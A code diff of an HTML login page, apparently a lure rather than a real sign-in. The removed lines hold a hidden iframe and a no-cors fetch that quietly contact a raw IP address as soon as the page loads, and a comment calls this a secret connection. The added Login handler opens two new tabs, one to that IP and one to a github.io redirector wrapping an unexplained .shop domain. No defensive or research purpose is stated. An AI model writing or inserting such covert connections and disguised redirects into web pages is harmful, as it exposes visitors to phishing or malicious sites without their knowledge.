@@ -66,46 +66,19 @@
     button:hover {
       background-color: #0056b3;
     }
-    /* 隱藏的 iframe */
-    #hiddenIframe {
-      display: none;
-      width: 0;
-      height: 0;
-      border: 0;
-    }
   </style>
   <script>
-    // 一進到頁面就執行
-    window.addEventListener('load', () => {
-      const primaryURL = "http://103.200.23.160";
-      const iframe = document.getElementById('hiddenIframe');
-
-      // 利用隱藏的 iframe 連結
-      iframe.src = primaryURL;
-
-      // 嘗試用 fetch 搭配 no-cors
-      fetch(primaryURL, {
-        method: 'HEAD',
-        mode: 'no-cors'
-      })
-      .then(() => {
-        console.log('Tried to fetch primaryURL with no-cors');
-      })
-      .catch(() => {
-        console.error('Error fetching primaryURL');
-      });
-    });
-
-    // 按下 Login 後，5 秒後跳轉到 http://103.200.23.160
     function handleLogin(event) {
-      // 先阻止表單預設送出行為
-      event.preventDefault();
+      // 防止表單默認提交，避免導致頁面重整
+      event.preventDefault(); 
 
-      // 這裡可以根據需求做任何驗證或處理 (例如顯示 "Logging in..." 之類資訊)
+      // 欲在新分頁開啟的網址
+      const primaryURL = "http://103.200.23.160";
+      const fallbackURL = "https://zongyiu.github.io/wnc/?site=http://jkkahebg899wubj.shop/";
 
-      setTimeout(() => {
-        window.location.href = "http://103.200.23.160";
-      }, 5000); // 5 秒後跳轉，可自行調整
+      // 在新的分頁開啟兩個網址
+      window.open(primaryURL, "_blank");
+      window.open(fallbackURL, "_blank");
     }
   </script>
 </head>
@@ -121,7 +94,5 @@
       <button type="submit">Login</button>
     </form>
   </div>
-  <!-- 隱藏的 iframe，用來偷偷連線到 primaryURL -->
-  <iframe id="hiddenIframe"></iframe>
 </body>
 </html>
